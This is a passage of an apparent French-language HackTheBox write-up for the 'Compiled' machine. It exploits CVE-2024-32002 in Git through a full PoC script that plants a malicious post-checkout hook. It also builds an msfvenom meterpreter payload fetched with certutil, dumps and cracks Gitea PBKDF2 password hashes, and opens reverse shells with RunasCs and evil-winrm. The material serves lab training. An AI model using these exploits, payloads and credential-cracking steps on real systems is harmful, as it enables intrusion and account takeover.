</span></span><span style=display:flex><span>SF:style&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20/<span style=color:#98c379>\*\x</span>20Add<span style=color:#98c379>\x</span>20your<span style=color:#98c379>\x</span>20custom<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0CSS<span style=color:#98c379>\x</span>20here<span style=color:#98c379>\x</span>20<span style=color:#98c379>\*</span>/<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20body<span style=color:#98c379>\x</span>20<span style=color:#56b6c2>{</span><span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20font-family:<span style=color:#98c379>\x</span>20<span style=color:#98c379>&#39;Ubuntu\x20Mon
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:o&#39;</span>,<span style=color:#98c379>\x</span>20monospace;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20back
</span></span><span style=display:flex><span>SF:ground-color:<span style=color:#98c379>\x</span>20#272822;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20color:<span style=color:#98c379>\x</span>20#ddd;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#56b6c2>}</span><span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\.</span>jumbotron<span style=color:#98c379>\x</span>20<span style=color:#56b6c2>{</span><span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20background-color:<span style=color:#98c379>\x</span>20#1e1e1e;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20color:<span style=color:#98c379>\x</span>20#fff;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20padding:<span style=color:#98c379>\x</span>20100px<span style=color:#98c379>\x</span>2020px;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20margin-bottom:<span style=color:#98c379>\x</span>200;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#56b6c2>}</span><span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\.</span>services<span style=color:#98c379>\x</span>20<span style=color:#56b6c2>{</span><span style=color:#98c379>\n\x</span>20<span style=color:#98c379>&#34;)%r(RTSPRequ
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:est,16C,&#34;</span>&lt;!DOCTYPE<span style=color:#98c379>\x</span>20HTML&gt;<span style=color:#98c379>\n</span>&lt;html<span style=color:#98c379>\x</span>20lang<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>en<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;he
</span></span><span style=display:flex><span>SF:ad&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;meta<span style=color:#98c379>\x</span>20charset<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>utf-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;title&gt;Error<span style=color:#98c379>\x</span>20response&lt;/title&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#98c379>\x</span>20&lt;/head&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;body&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:&lt;h1&gt;Error<span style=color:#98c379>\x</span>20response&lt;/h1&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Error<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0code:<span style=color:#98c379>\x</span>20400&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Message:<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20request<span style=color:#98c379>\x</span>20version<span style=color:#98c379>\x</span>20<span style=color:#98c379>\(</span><span style=color:#98c379>&#39;RTSP/1\.0&#39;</span><span style=color:#98c379>\)\.</span>&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>20</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Error<span style=color:#98c379>\x</span>20code<span style=color:#98c379>\x</span>20explanation:<span style=color:#98c379>\x</span>20400<span style=color:#98c379>\x</span>20-<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20request<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20syntax<span style=color:#98c379>\x</span>20or<span style=color:#98c379>\x</span>20unsupported<span style=color:#98c379>\x</span>20method<span style=color:#98c379>\.</span>&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;/body&gt;
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\n</span>&lt;/html&gt;<span style=color:#98c379>\n</span><span style=color:#98c379>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#98c379>Nmap done: 1 IP address (1 host up) scanned in 157.50 seconds
</span></span></span></code></pre></div><p>Nous trouvons deux ports ouverts 3000 et 5000, nmap n&rsquo;est pas en mesure de fournir des informations précises sur les services fonctionnant sur ces ports.</p><h2 id=enumération>Enumération</h2><p>À <code>http://compiled.htb:3000/</code>, nous trouvons une instance de Gitea.</p><p><img src=/images/HTB-Compiled/gitea_instance.png alt="Gitea instance"></p><p>À <code>http://compiled.htb:5000/</code>, nous trouvons un site web offrant des services de compilation.</p><p><img src=/images/HTB-Compiled/compiled_website.png alt="Compiled website"></p><p>Dans la section <code>Explore</code> de Gitea nous trouvons deux dépôts, un pour le site web sur le port 5000 et un autre pour un programme de calculatrice.</p><p><img src=/images/HTB-Compiled/repository_list.png alt="Repository list"></p><p>Pour utiliser l&rsquo;application sur le port 5000, nous devons fournir une URL pour un dépôt Github se terminant par <code>.git</code>.</p><p><img src=/images/HTB-Compiled/compiled_usage.png alt="Compiled usage instructions"></p><p>Dans le dépôt de la calculatrice, nous trouvons une version pour Git (2.45.0.windows.1).</p><p><img src=/images/HTB-Compiled/git_version.png alt="Git version"></p><p>Après avoir cherché <code>git version 2.45.0 cve</code> sur Google, nous trouvons le <a href=https://www.cvedetails.com/cve/CVE-2024-32002/>CVE-2024-32002</a> avec un PoC disponible <a href=https://amalmurali.me/posts/git-rce/>ici</a>.</p><h3 id=explication-de-lexploitation>Explication de l&rsquo;exploitation</h3><p>Notre processus d&rsquo;exploitation s&rsquo;appuie sur une vulnérabilité de Git (CVE-2024-32002) résultant d&rsquo;une mauvaise gestion des liens symboliques dans les systèmes de fichiers qui ne font pas la différence entre majuscules et minuscules (ce qui signifie que des chemins tels que <code>A/modules/x</code> et <code>a/modules/x</code> sont traités comme étant identiques). Cette vulnérabilité nous permet de manipuler Git pour qu&rsquo;il écrive des fichiers dans le répertoire <code>.git/</code>.</p><p>Le processus consiste à créer un dépôt malveillant (<code>scorpion</code>) avec un post-checkout hook contenant un reverse shell payload. Ce hook est configuré pour s&rsquo;exécuter lors d&rsquo;opérations Git spécifiques, comme checkout. Nous utilisons ensuite <code>git submodule add</code> pour lier <code>scorpion</code> en tant que submodule d&rsquo;un autre dépôt, <code>venom</code>. De cette manière, lorsque le sous-module est traité, le payload de <code>scorpion</code> est déclenché.</p><p>Un aspect essentiel de l&rsquo;exploit consiste à exploiter la possibilité de Git de mettre à jour le répertoire <code>.git/</code> par le biais de liens symboliques. En créant un lien symbolique pointant vers <code>dotgit.txt</code>, nous trompons Git en traitant le contenu manipulé comme des métadonnées légitimes. Les contrôles de validation sont ainsi contournés, ce qui nous permet de placer notre payload dans le répertoire <code>.git/hooks</code>.</p><p>Enfin, nous soumettons l&rsquo;URL du dépôt <code>venom</code> dans l&rsquo;application cible qui clone et compile les dépôts. Au cours du processus de clonage, Git traite le sous-module et rencontre le hook malveillant post-checkout dans <code>scorpion</code>. Ce hook exécute notre payload, et établit une connexion avec notre listener.</p><h2 id=accès-initial>Accès initial</h2><p>Tout d&rsquo;abord, nous devons enregistrer un nouveau compte sur l&rsquo;instance gitea.</p><p><img src=/images/HTB-Compiled/gitea_account_creation.png alt="Gitea account creation"></p><p>Nous créons également deux dépôts.</p><p><img src=/images/HTB-Compiled/exploit_repos.png alt="Gitea exploit repositories"></p><p><a href=https://github.com/amalmurali47/git_rce/blob/main/create_poc.sh>Ici</a>, nous trouvons le script Bash utilisé pour le PoC, nous le modifions pour nos besoins.</p><p>Comme nous utilisons probablement un nouveau compte git, nous devons d&rsquo;abord vérifier notre identité avec:</p><pre tabindex=0><code>git config --global user.email &#34;you@example.com&#34;
git config --global user.name &#34;Your Name&#34;
</code></pre><p>Vous trouverez ci-dessous le script exact que j&rsquo;ai utilisé, vous devez y ajouter une commande de reverse shell.</p><blockquote><p>Si vous avez choisi des noms différents pour vos dépôts, vous devrez les modifier dans le script.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Configure Git settings for exploitation</span>
</span></span><span style=display:flex><span>git config --global protocol.file.allow always
</span></span><span style=display:flex><span>git config --global core.symlinks <span style=color:#e5c07b>true</span>
</span></span><span style=display:flex><span>git config --global init.defaultBranch main
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Clone the malicious repository (scorpion)</span>
</span></span><span style=display:flex><span>git clone http://compiled.htb:3000/kscorpio/scorpion.git
</span></span><span style=display:flex><span><span style=color:#e5c07b>cd</span> scorpion
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Set up the post-checkout hook with the reverse shell payload</span>
</span></span><span style=display:flex><span>mkdir -p y/hooks
</span></span><span style=display:flex><span>cat &gt;y/hooks/post-checkout <span style=color:#98c379>&lt;&lt;EOF
</span></span></span><span style=display:flex><span><span style=color:#98c379>#!/bin/sh
</span></span></span><span style=display:flex><span><span style=color:#98c379>&lt;INSERT YOUR PowerShell #3 (Base64) reverse shell from revshells.com here&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>EOF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Make the hook executable</span>
</span></span><span style=display:flex><span>chmod +x y/hooks/post-checkout
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Commit the hook to the repository</span>
</span></span><span style=display:flex><span>git add y/hooks/post-checkout
</span></span><span style=display:flex><span>git commit -m <span style=color:#98c379>&#34;post-checkout&#34;</span>
</span></span><span style=display:flex><span>git push
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Clone the venom repository and add the malicious submodule</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>cd</span> ..
</span></span><span style=display:flex><span>git clone http://compiled.htb:3000/kscorpio/venom.git
</span></span><span style=display:flex><span><span style=color:#e5c07b>cd</span> venom
</span></span><span style=display:flex><span>git submodule add --name x/y <span style=color:#98c379>&#34;http://compiled.htb:3000/kscorpio/scorpion.git&#34;</span> A/modules/x
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Commit and push the submodule addition</span>
</span></span><span style=display:flex><span>git commit -m <span style=color:#98c379>&#34;add-submodule&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>printf</span> <span style=color:#98c379>&#34;.git&#34;</span> &gt;dotgit.txt
</span></span><span style=display:flex><span>git hash-object -w --stdin &lt;dotgit.txt &gt;dot-git.hash
</span></span><span style=display:flex><span><span style=color:#e5c07b>printf</span> <span style=color:#98c379>&#34;120000 %s 0\ta\n&#34;</span> <span style=color:#98c379>&#34;</span><span style=color:#c678dd>$(</span>cat dot-git.hash<span style=color:#c678dd>)</span><span style=color:#98c379>&#34;</span> &gt;index.info
</span></span><span style=display:flex><span>git update-index --index-info &lt;index.info
</span></span><span style=display:flex><span>git commit -m <span style=color:#98c379>&#34;add-symlink&#34;</span>
</span></span><span style=display:flex><span>git push
</span></span></code></pre></div><p><img src=/images/HTB-Compiled/exploit_script.png alt="exploit script execution"></p><p>Après avoir exécuté le script, nous soumettons le lien de notre second dépôt à <code>http://compiled.htb:5000/</code>.</p><p><img src=/images/HTB-Compiled/malicious_url.png alt="malicious url"></p><p>Quelques instants après, nous obtenons un shell sous le nom de <code>Richard</code>.</p><p><img src=/images/HTB-Compiled/initial_foothold.png alt="initial foothold"></p><p>Le drapeau utilisateur n&rsquo;est pas sur ce compte, nous devons donc chercher ailleurs. Il y a un autre utilisateur appelé <code>Emily</code> sur la cible, nous devons probablement accéder à ce compte.</p><p>Avec <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20241205-c8c0c3e5>winPEAS</a>, nous apprenons que <code>Emily</code> est actuellement connectée sur le système et que <code>Richard</code> a un accès complet à <code>C:\Program Files\Gitea</code> que nous explorerons plus en détail.</p><p><img src=/images/HTB-Compiled/logged_users.png alt="Logged users"></p><p><img src=/images/HTB-Compiled/Gitea_directory.png alt="Gitea directory"></p><h3 id=mouvement-latéral-shell-en-tant-que-emily>Mouvement latéral (shell en tant que Emily)</h3><p>Dans <code>C:\Program Files\Gitea\data</code> nous trouvons le fichier <code>gitea.db</code>. Si Emily a un compte sur l&rsquo;instance Gitea, nous pourrions y trouver ses identifiants.</p><p><img src=/images/HTB-Compiled/gitea_db.png alt="Gitea db file"></p><p>Pour télécharger le fichier, nous passons à un shell meterpreter.</p><p>Créez un fichier exécutable et l&rsquo;envoyer à la cible.</p><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe


certutil.exe -urlcache -split -f http://WEBSERVER_IP:PORT_NUMBER/payload.exe payload.exe
</code></pre><p><img src=/images/HTB-Compiled/msf_exe.png alt="malicious exe file"></p><p>Configurez le listener dans Metasploit.</p><pre tabindex=0><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost &lt;YOUR_IP&gt;
set lport &lt;PORT_NUMBER&gt;
run
</code></pre><p>Après avoir exécuté le fichier <code>.exe</code> sur la cible, nous obtenons un shell meterpreter. Nous pouvons maintenant facilement télécharger <code>gitea.db</code> avec <code>download "C:\Program Files\Gitea\data\Ngitea.db"</code>.</p><p><img src=/images/HTB-Compiled/gitea_db_download.png alt="Gitea db file download"></p><p>Nous exécutons les requêtes suivantes et obtenons les hachages des utilisateurs.</p><pre tabindex=0><code>sqlite3 gitea.db

.tables

select * FROM user;
</code></pre><p><img src=/images/HTB-Compiled/hashes_in_giteadb.png alt="hashes in the gitea.db file"></p><p>Il s&rsquo;agit de hachages PBKDF2.</p><blockquote><p>PBKDF2 (Password-Based Key Derivation Function 2) est un algorithme cryptographique utilisé pour dériver des clés cryptographiques sécurisées à partir d&rsquo;un mot de passe. Il applique une fonction pseudo-aléatoire (telle que HMAC) de manière itérative au mot de passe ainsi qu&rsquo;à un sel (une valeur aléatoire) pour générer une clé. Le processus est répété de nombreuses fois (souvent des milliers ou des dizaines de milliers d&rsquo;itérations) afin de ralentir les attaques par force brute et de rendre plus difficile la récupération du mot de passe original par les attaquants.</p></blockquote><p>Cette <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">page de hashcat</a> nous apprend que le hash doit respecter ce format:
<code>&lt;HASH_ALGORITHM>:&lt;NUMBER_OF_ITERATIONS>:&lt;base64_SALT>:&lt;base64_hash></code>. Par exemple:</p><pre tabindex=0><code>sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
</code></pre><p>Hashcat prend beaucoup de temps pour cracker le hash, ce qui est inhabituel pour HackTheBox, nous arrêtons donc le processus et utilisons une autre méthode.</p><p><img src=/images/HTB-Compiled/hashcat_toolong.png alt="hashcat cracking process taking too long"></p><p>J&rsquo;ai demandé à ChatGPT un script Python pour trouver le mot de passe. Cette solution est possible car nous disposons déjà de toutes les informations dont nous avons besoin :</p><ul><li>L&rsquo;algorithme: pbkdf2</li><li>La valeur du hachage: <code>97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16</code></li><li>Le nombre d&rsquo;itérations: 50000</li><li>La valeur du sel: <code>227d873cca89103cd83a976bdac52486</code></li><li>La longueur de la clé: 50</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>hashlib</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>pbkdf2_decrypt</span>(<span style=color:#e06c75>hash_value</span>, <span style=color:#e06c75>salt</span>, <span style=color:#e06c75>iterations</span>, <span style=color:#e06c75>key_length</span>, <span style=color:#e06c75>wordlist_path</span>):
</span></span><span style=display:flex><span>    <span style=color:#7f848e># Convert the salt and hash to bytes (hex decoding)</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>salt</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>bytes</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>fromhex</span>(<span style=color:#e06c75>salt</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>hash_value</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>bytes</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>fromhex</span>(<span style=color:#e06c75>hash_value</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#7f848e># Open the wordlist file</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>wordlist_path</span>, <span style=color:#98c379>&#39;r&#39;</span>, <span style=color:#e06c75>encoding</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;utf-8&#39;</span>, <span style=color:#e06c75>errors</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;ignore&#39;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>wordlist</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#e06c75>word</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>wordlist</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>word</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>word</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()  <span style=color:#7f848e># Remove any trailing spaces or newline characters</span>
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Hash the current word using PBKDF2 with HMAC SHA256</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>derived_key</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>hashlib</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>pbkdf2_hmac</span>(<span style=color:#98c379>&#39;sha256&#39;</span>, <span style=color:#e06c75>word</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>(), <span style=color:#e06c75>salt</span>, <span style=color:#e06c75>iterations</span>, <span style=color:#e06c75>dklen</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>key_length</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Check if the derived key matches the target hash</span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>if</span> <span style=color:#e06c75>derived_key</span> <span style=color:#56b6c2>==</span> <span style=color:#e06c75>hash_value</span>:
</span></span><span style=display:flex><span>                <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;Password found: </span><span style=color:#98c379>{</span><span style=color:#e06c75>word</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#c678dd>return</span> <span style=color:#e06c75>word</span>  <span style=color:#7f848e># Return the password if it matches</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Password not found in the wordlist.&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#e5c07b>None</span>  <span style=color:#7f848e># Return None if no match is found</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Example of usage</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>hash_value</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16&#39;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>salt</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;227d873cca89103cd83a976bdac52486&#39;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>iterations</span> <span style=color:#56b6c2>=</span> <span style=color:#d19a66>50000</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>key_length</span> <span style=color:#56b6c2>=</span> <span style=color:#d19a66>50</span>  <span style=color:#7f848e># The length of the derived key in bytes</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>wordlist_path</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;/usr/share/wordlists/rockyou.txt&#39;</span>  <span style=color:#7f848e># Path to the wordlist</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Call the function to start the cracking process</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>password</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>pbkdf2_decrypt</span>(<span style=color:#e06c75>hash_value</span>, <span style=color:#e06c75>salt</span>, <span style=color:#e06c75>iterations</span>, <span style=color:#e06c75>key_length</span>, <span style=color:#e06c75>wordlist_path</span>)
</span></span></code></pre></div><p>Grâce au script, nous trouvons le mot de passe: <code>12345678</code>.</p><p><img src=/images/HTB-Compiled/emily_pwd.png alt="Emily password found"></p><p>Nous utilisons <code>RunasCs.exe</code> pour obtenir un shell sous le nom de <code>Emily</code> avec la commande ci-dessous.</p><pre tabindex=0><code>.\runascs.exe Emily &#34;12345678&#34; powershell -r 10.10.14.231:5555
</code></pre><p><img src=/images/HTB-Compiled/emily_rcs_shell.png alt="Emily RunasCs shell"></p><p>Il est également possible de se connecter sous le nom de <code>Emily</code> via <code>evil-winrm</code>, et le drapeau utilisateur se trouve dans <code>C:\Users\Emily\Desktop</code>.</p><pre tabindex=0><code>evil-winrm -u &#34;Emily&#34; -p &#34;12345678&#34; -i compiled.htb
</code></pre><p><img src=/images/HTB-Compiled/emily_shell.png alt="Emily shell"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>Nous relançons <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20241205-c8c0c3e5>winPEAS</a> et trouvons une information relative à Microsoft Visual Studio.</p><pre tabindex=0><code>File Permissions &#34;C:\Users\All Users\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe&#34;: Authenticated Users [WriteData/CreateFiles]
